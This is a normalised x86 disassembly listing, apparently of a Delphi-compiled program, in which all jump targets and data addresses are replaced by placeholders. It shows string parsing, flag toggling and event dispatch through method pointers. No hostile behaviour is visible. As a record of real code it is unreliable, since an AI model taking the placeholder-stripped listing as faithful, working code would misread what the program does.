cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
sub eax 0x4
jb r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
dec eax
je r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
lea eax [ ebx + 0xf8 ]
mov edx [ ebx + 0x2d4 ]
call sub_403f4c
mov dl 0x4
mov eax ebx
call sub_46c814
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov eax [ ebx + 0x110 ]
mov edx [ ebx + 0xec ]
call sub_404304
jne r-xdata
lea eax [ ebx + 0x110 ]
mov edx [ ebx + 0xec ]
call sub_403f4c
jmp r-xdata
lea ecx [ ebp - 0x1c4 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x1c4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_46b3c0
xor ecx ecx
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
lea eax [ ebp - 0x1b4 ]
push eax
lea ecx [ ebp - 0x1b8 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
call sub_404418
mov edx [ ebp - 0x1b4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_46b3c0
lea eax [ ebp - 0x1bc ]
push eax
lea ecx [ ebp - 0x1c0 ]
mov edx 0x5
mov esi [ ebx + 0x2c8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c0 ]
mov edx [ ebp - 0x8 ]
inc edx
mov ecx 0x200
call sub_404418
mov ecx [ ebp - 0x1bc ]
mov edx 0x5
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
push 0x0
push 0x0
mov esi [ ebp - 0xc ]
mov cl 0x3
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x54 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x58 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x50 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
jmp r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
add eax 0xffffff40
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x110 ] 0x0
je r-xdata
cmp [ ebx + 0x272 ] 0x0
je r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x3c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x40 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x20 ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
jmp r-xdata
mov dl 0x1
mov eax ebx
call sub_46c1cc
jmp r-xdata
mov edx [ ebx + 0x110 ]
mov eax ebx
call sub_46c5ac
jmp r-xdata
lea eax [ ebx + 0x110 ]
call sub_403ef8
lea ecx [ ebx + 0x110 ]
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
jmp r-xdata
sub_46f9d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46fa2d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
or esi 0xffffffff
jmp r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa34
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp ebx 0x3
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebx * 4 + rw-data ]
call sub_404304
jne r-xdata
inc ebx
mov esi ebx
sub_46fa3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46fa95
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
or esi 0xffffffff
jmp r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa9c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp ebx 0x9
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebx * 4 + rw-data ]
call sub_404304
jne r-xdata
inc ebx
mov esi ebx
sub_46faa4
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push j_sub_403878#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041c0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4044fc
test eax eax
jg r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4044fc
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404418
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4044fc
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_404458
lea ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_46f9d4
sub eax 0x1
jb r-xdata
cmp [ esi + 0x292 ] 0x0
je r-xdata
je r-xdata
mov eax ebx
call sub_403124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fd18
lea eax [ ebp - 0x3c ]
mov edx 0xf
call sub_403f1c
retn
lea ecx [ ebp - 0x10 ]
mov edx 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx 0x3
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ esi + 0x2d0 ]
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
jmp r-xdata
cmp [ esi + 0x28a ] 0x0
je r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx 0x3
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ esi + 0x2d0 ]
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
jmp r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0x28 ]
mov edx 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x2c ]
mov edx 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
mov edx 0x3
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x2d0 ]
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
jmp r-xdata
cmp [ esi + 0x2a2 ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x34 ]
mov edx 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x3c ]
mov edx 0x3
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ esi + 0x2d0 ]
mov edx esi
mov eax [ esi + 0x2a4 ]
call [ esi + 0x2a0 ]
sub_46fd2c
push ebp
mov ebp esp
mov ecx 0xc
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_403878#8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x14 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4041b8
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x18 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_4044fc
mov esi eax
test esi esi
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0xc ]
sub ecx 0x2
mov edx 0x2
call sub_404418
lea eax [ ebp - 0x8 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx esi
sub ecx 0x2
mov edx 0x2
call sub_404418
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
sub ecx esi
dec ecx
lea edx [ esi + 0x1 ]
call sub_404418
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2e4 ]
call sub_46b038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4702d8
lea eax [ ebp - 0x60 ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp - 0x4c ]
mov edx 0xf
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
jmp [ eax * 4 + jump_table_46fe4f ]
mov [ ebp - 0xd ] 0x0
mov ecx [ ebx + 0x2d4 ]
mov edx [ ebx + 0x2d0 ]
mov eax [ ebx + 0x2e4 ]
call sub_46af88
mov esi eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46fa3c
inc eax
cmp eax 0xa
ja r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
cmp [ ebx + 0x24a ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46faa4
lea ecx [ ebp - 0x28 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
jmp r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x38 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x3c ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x3c ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x40 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x40 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x44 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea ecx [ ebp - 0x48 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
lea ecx [ ebp - 0x60 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x60 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
mov eax [ ebx + 0x108 ]
mov eax [ eax + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
mov eax [ ebx + 0x108 ]
mov eax [ eax + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
mov eax [ ebx + 0x108 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
mov eax [ ebx + 0x108 ]
mov eax [ eax + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
call sub_40995c
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x58 ]
call sub_40a594
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] 0xb
lea eax [ ebp - 0x54 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x5c ]
xor ecx ecx
pop edx
call sub_408d28
mov eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x2d0 ]
mov eax ebx
call sub_46c3b8
jmp r-xdata
sub_4702ec
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_403878#7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4041b8
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x14 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_4044fc
mov esi eax
test esi esi
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
sub ecx 0x2
mov edx 0x2
call sub_404418
lea eax [ ebp - 0x8 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
mov ecx esi
sub ecx 0x2
mov edx 0x2
call sub_404418
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
sub ecx esi
dec ecx
lea edx [ esi + 0x1 ]
call sub_404418
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2e4 ]
call sub_46b038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470481
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
cmp [ ebx + 0x252 ] 0x0
je r-xdata
mov ecx [ ebx + 0x2d4 ]
mov edx [ ebx + 0x2d0 ]
mov eax [ ebx + 0x2e4 ]
call sub_46af88
mov esi eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46fa3c
inc eax
sub eax 0xa
jae r-xdata
lea ecx [ ebp - 0x24 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x24 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_470494
push ebp
mov ebp esp
mov ecx 0x9
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47097b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x1d ] 0x1
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x24 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470982
lea eax [ ebp - 0x48 ]
mov edx 0xa
call sub_403f1c
retn
mov edx [ ebx + 0x2d0 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b100
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov al [ eax + 0x18 ]
mov [ ebp - 0x1e ] al
mov eax [ ebp - 0x4 ]
add eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x28 ]
call sub_4041b8
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x14 ]
mov dl [ ebp - 0x1e ]
cmp dl [ eax + 0x18 ]
setne [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x1
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x14 ]
call sub_46b2fc
add eax 0xffffff92
cmp eax 0x8
ja r-xdata
je r-xdata
inc [ ebp - 0xc ]
dec esi
jne r-xdata
jmp [ eax * 4 + jump_table_4705ad ]
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
cmp eax 0x69
jg r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x6d
jg r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x40 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b100
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
lea ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b100
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
sub eax 0x6b
je r-xdata
je r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
cmp [ ebx + 0x202 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_46b608
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b100
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_46b5b4
inc [ ebp - 0x10 ]
jmp r-xdata
